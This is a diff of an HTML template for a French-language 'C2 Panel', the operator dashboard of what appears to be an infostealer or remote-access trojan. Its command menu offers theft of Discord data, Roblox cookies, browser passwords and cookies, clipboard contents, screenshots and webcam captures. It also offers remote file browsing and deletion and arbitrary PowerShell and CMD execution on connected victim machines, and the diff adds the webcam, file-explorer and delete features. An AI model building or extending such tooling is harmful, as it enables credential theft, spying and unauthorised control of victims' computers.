@@ -4,101 +4,184 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>C2 Panel</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
+    <div id="notification-container"></div>
     <div class="app-container">
+        <!-- SIDEBAR -->
         <aside class="sidebar">
-            <div class="logo">
-                <span class="logo-icon"><i class="fas fa-bullseye"></i></span>
-                <span class="logo-text">C2 Panel</span>
+            <div class="sidebar-brand">
+                <div class="brand-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"/>
+                        <circle cx="12" cy="12" r="6"/>
+                        <circle cx="12" cy="12" r="2"/>
+                    </svg>
+                </div>
+                <div class="brand-text">C2 Panel</div>
             </div>
-            <nav class="nav-menu">
+            <nav class="sidebar-nav">
                 <a href="#" class="nav-item active" data-page="dashboard">
-                    <i class="fas fa-chart-pie nav-icon"></i> Dashboard
+                    <span class="nav-icon"><i class="fas fa-th-large"></i></span>
+                    <span>Dashboard</span>
                 </a>
                 <a href="#" class="nav-item" data-page="clients">
-                    <i class="fas fa-desktop nav-icon"></i> Clients
-                </a>
-                <a href="#" class="nav-item" data-page="activities">
-                    <i class="fas fa-history nav-icon"></i> Activités
+                    <span class="nav-icon"><i class="fas fa-desktop"></i></span>
+                    <span>Clients</span>
                 </a>
             </nav>
             <div class="sidebar-footer">
-                <div class="user-info">
-                    <i class="fas fa-user-circle"></i> {{ username }}
+                <div class="user-badge">
+                    <i class="fas fa-user-circle"></i>
+                    <span>{{ username }}</span>
                 </div>
-                <a href="/logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Déconnexion</a>
+                <a href="/logout" class="logout-link"><i class="fas fa-sign-out-alt"></i> Deconnexion</a>
             </div>
         </aside>
 
+        <!-- MAIN CONTENT -->
         <main class="main-content">
-            <header class="header">
-                <h1 id="page-title">Dashboard</h1>
-                <button class="refresh-btn" onclick="refreshAll()"><i class="fas fa-sync-alt"></i> Actualiser</button>
+            <header class="topbar">
+                <h1 id="page-title" class="topbar-title">Dashboard</h1>
+                <div class="topbar-actions">
+                    <div class="connection-indicator" id="connection-indicator" title="En ligne">
+                        <span class="conn-dot"></span>
+                        <span class="conn-text">En ligne</span>
+                    </div>
+                    <button class="btn-icon" id="refresh-btn" onclick="refreshAll()" title="Actualiser">
+                        <i class="fas fa-sync-alt"></i>
+                    </button>
+                </div>
             </header>
 
+            <!-- DASHBOARD PAGE -->
             <div id="dashboard-page" class="page active">
                 <div class="stats-grid">
-                    <div class="stat-card"><div class="stat-icon"><i class="fas fa-hdd"></i></div><div class="stat-info"><h3 id="total-clients">0</h3><p>Clients</p></div></div>
-                    <div class="stat-card"><div class="stat-icon"><i class="fas fa-circle" style="color:#22c55e;"></i></div><div class="stat-info"><h3 id="online-clients">0</h3><p>En ligne</p></div></div>
-                    <div class="stat-card"><div class="stat-icon"><i class="fas fa-clock"></i></div><div class="stat-info"><h3 id="pending-commands">0</h3><p>En attente</p></div></div>
-                    <div class="stat-card"><div class="stat-icon"><i class="fas fa-check"></i></div><div class="stat-info"><h3 id="executed-commands">0</h3><p>Exécutées</p></div></div>
+                    <div class="stat-card">
+                        <div class="stat-icon-box icon-blue">
+                            <i class="fas fa-hdd"></i>
+                        </div>
+                        <div class="stat-body">
+                            <span class="stat-value" id="total-clients">0</span>
+                            <span class="stat-label">Clients totaux</span>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon-box icon-green">
+                            <i class="fas fa-signal"></i>
+                        </div>
+                        <div class="stat-body">
+                            <span class="stat-value" id="online-clients">0</span>
+                            <span class="stat-label">En ligne</span>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon-box icon-amber">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="stat-body">
+                            <span class="stat-value" id="pending-commands">0</span>
+                            <span class="stat-label">En attente</span>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon-box icon-teal">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <div class="stat-body">
+                            <span class="stat-value" id="executed-commands">0</span>
+                            <span class="stat-label">Executees</span>
+                        </div>
+                    </div>
                 </div>
-                <div class="recent-activities">
-                    <h2>Activités récentes</h2>
-                    <div id="recent-activities" class="activities-list"></div>
+
+                <div class="dashboard-section">
+                    <h2 class="section-title">Clients recents</h2>
+                    <div id="recent-clients" class="recent-clients-list"></div>
                 </div>
             </div>
 
+            <!-- CLIENTS PAGE -->
             <div id="clients-page" class="page">
-                <div class="clients-header">
-                    <input type="text" id="client-search" placeholder="Rechercher..." onkeyup="filterClients()">
+                <div class="section-header">
+                    <input type="text" id="client-search" class="search-input" placeholder="Rechercher un client..." onkeyup="filterClients()">
                 </div>
                 <div id="clients-grid" class="clients-grid"></div>
-            </div>
-
-            <div id="activities-page" class="page">
-                <div id="activities-full" class="activities-full"></div>
             </div>
         </main>
     </div>
 
     <!-- MODAL COMMANDE -->
     <div id="command-modal" class="modal">
-        <div class="modal-content">
+        <div class="modal-content command-modal-content">
             <div class="modal-header">
                 <h2><i class="fas fa-terminal"></i> Commande</h2>
-                <span class="close" onclick="closeModal()">&times;</span>
+                <span class="modal-close" onclick="closeModal()">&times;</span>
             </div>
             <div class="modal-body">
-                <p>Client : <strong id="modal-client-name"></strong></p>
+                <p class="modal-client-name">Client : <strong id="modal-client-name"></strong></p>
                 <div class="form-group">
-                    <label>Type</label>
-                    <select id="command-type">
-                        <option value="ping">🏓 Ping</option>
-                        <option value="system_info">💻 Système</option>
-                        <option value="discord_data">🎮 Discord</option>
-                        <option value="roblox_cookie">🎲 Roblox</option>
-                        <option value="browser_passwords">🔑 Mots de passe</option>
-                        <option value="browser_cookies">🍪 Cookies</option>
-                        <option value="screenshot">📸 Capture</option>
-                        <option value="clipboard">📋 Presse-papier</option>
-                        <option value="list_processes">📊 Processus</option>
-                        <option value="execute_ps">⚡ PowerShell</option>
-                        <option value="execute_cmd">💻 CMD</option>
-                    </select>
+                    <label>Type de commande</label>
+                    <div class="custom-select" id="command-type-wrapper">
+                        <div class="custom-select-trigger" id="command-type-trigger">
+                            <span class="selected-text"><i class="fas fa-heartbeat" style="color:var(--red);"></i> Ping</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <div class="custom-select-options" id="command-type-options">
+                            <div class="custom-option" data-value="ping">
+                                <i class="fas fa-heartbeat" style="color:var(--red);"></i> Ping
+                            </div>
+                            <div class="custom-option" data-value="system_info">
+                                <i class="fas fa-info-circle" style="color:var(--accent);"></i> Systeme
+                            </div>
+                            <div class="custom-option" data-value="discord_data">
+                                <i class="fab fa-discord" style="color:#5865F2;"></i> Discord
+                            </div>
+                            <div class="custom-option" data-value="roblox_cookie">
+                                <i class="fas fa-gamepad" style="color:var(--green);"></i> Roblox
+                            </div>
+                            <div class="custom-option" data-value="browser_passwords">
+                                <i class="fas fa-key" style="color:var(--amber);"></i> Mots de passe
+                            </div>
+                            <div class="custom-option" data-value="browser_cookies">
+                                <i class="fas fa-cookie-bite" style="color:#D2691E;"></i> Cookies
+                            </div>
+                            <div class="custom-option" data-value="screenshot">
+                                <i class="fas fa-camera" style="color:#8b8fa5;"></i> Capture d'ecran
+                            </div>
+                            <div class="custom-option" data-value="screenshot_webcam">
+                                <i class="fas fa-video" style="color:#8b8fa5;"></i> Webcam
+                            </div>
+                            <div class="custom-option" data-value="clipboard">
+                                <i class="fas fa-copy" style="color:#8b8fa5;"></i> Presse-papier
+                            </div>
+                            <div class="custom-option" data-value="list_processes">
+                                <i class="fas fa-list" style="color:#8b8fa5;"></i> Processus
+                            </div>
+                            <div class="custom-option" data-value="file_explorer">
+                                <i class="fas fa-folder-open" style="color:var(--amber);"></i> Explorateur fichiers
+                            </div>
+                            <div class="custom-option" data-value="execute_ps">
+                                <i class="fas fa-code" style="color:#8b8fa5;"></i> PowerShell
+                            </div>
+                            <div class="custom-option" data-value="execute_cmd">
+                                <i class="fas fa-terminal" style="color:#8b8fa5;"></i> CMD
+                            </div>
+                        </div>
+                    </div>
+                    <input type="hidden" id="command-type" value="ping">
                 </div>
                 <div class="form-group" id="command-params-group" style="display:none;">
-                    <label>Paramètres</label>
-                    <textarea id="command-params" rows="3"></textarea>
+                    <label>Parametres</label>
+                    <textarea id="command-params" rows="3" placeholder="Commande..."></textarea>
                 </div>
             </div>
             <div class="modal-footer">
-                <button class="btn-secondary" onclick="closeModal()">Annuler</button>
-                <button class="btn-primary" onclick="executeCommand()"><i class="fas fa-paper-plane"></i> Exécuter</button>
+                <button class="btn btn-outline" onclick="closeModal()">Annuler</button>
+                <button class="btn btn-primary" onclick="executeCommand()"><i class="fas fa-paper-plane"></i> Executer</button>
             </div>
         </div>
     </div>
@@ -106,31 +189,55 @@
     <!-- MODAL TRAITEMENT -->
     <div id="processing-modal" class="modal">
         <div class="modal-content modal-processing">
-            <div class="spinner-box">
-                <div class="spinner"></div>
-            </div>
-            <h3>Traitement en cours...</h3>
+            <div class="loader"></div>
+            <h3>Traitement en cours</h3>
             <p id="processing-timer">0s</p>
+            <button class="btn btn-cancel" id="cancel-btn" onclick="cancelCommand()" style="display:none;">
+                <i class="fas fa-times"></i> Annuler
+            </button>
         </div>
     </div>
 
-    <!-- MODAL RÉSULTAT -->
+    <!-- MODAL RESULTAT -->
     <div id="result-modal" class="modal">
-        <div class="modal-content modal-large">
+        <div class="modal-content modal-result">
             <div class="modal-header">
-                <h2 id="result-title"><i class="fas fa-check-circle"></i> Résultat</h2>
-                <span class="close" onclick="closeResultModal()">&times;</span>
+                <h2 id="result-title"><i class="fas fa-check-circle"></i> Resultat</h2>
+                <span class="modal-close" onclick="closeResultModal()">&times;</span>
             </div>
             <div class="modal-body" id="result-content"></div>
         </div>
     </div>
 
-    <!-- LIGHTBOX PLEIN ÉCRAN -->
-    <div id="lightbox-modal" class="modal lightbox-modal" onclick="closeLightbox()">
-        <span class="close-lightbox" onclick="closeLightbox()">&times;</span>
+    <!-- MODAL CONFIRMATION SUPPRESSION -->
+    <div id="delete-confirm-modal" class="modal">
+        <div class="modal-content modal-delete-confirm">
+            <div class="modal-header">
+                <h2><i class="fas fa-trash" style="color:var(--red);"></i> Confirmer la suppression</h2>
+                <span class="modal-close" onclick="closeDeleteConfirmModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <p style="color:var(--text-secondary);margin-bottom:12px;">Vous etes sur le point de supprimer ce <strong id="delete-confirm-label"></strong> de facon permanente :</p>
+                <div class="delete-confirm-path-box"><code id="delete-confirm-path"></code></div>
+                <p style="color:var(--red);font-size:12px;margin-top:12px;"><i class="fas fa-exclamation-triangle"></i> Cette action est irreversible.</p>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-outline" onclick="closeDeleteConfirmModal()">Annuler</button>
+                <button class="btn btn-danger" onclick="confirmDeleteRemotePath()"><i class="fas fa-trash"></i> Supprimer</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- LIGHTBOX -->
+    <div id="lightbox-modal" class="lightbox" onclick="closeLightbox()">
+        <span class="lightbox-close" onclick="closeLightbox()">&times;</span>
         <img id="lightbox-img" src="" onclick="event.stopPropagation()">
     </div>
 
+    <style>
+        .refresh-spinning { animation: spinRefresh 1s linear infinite; }
+        @keyframes spinRefresh { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    </style>
     <script src="{{ url_for('static', filename='script.js') }}"></script>
 </body>
 </html>
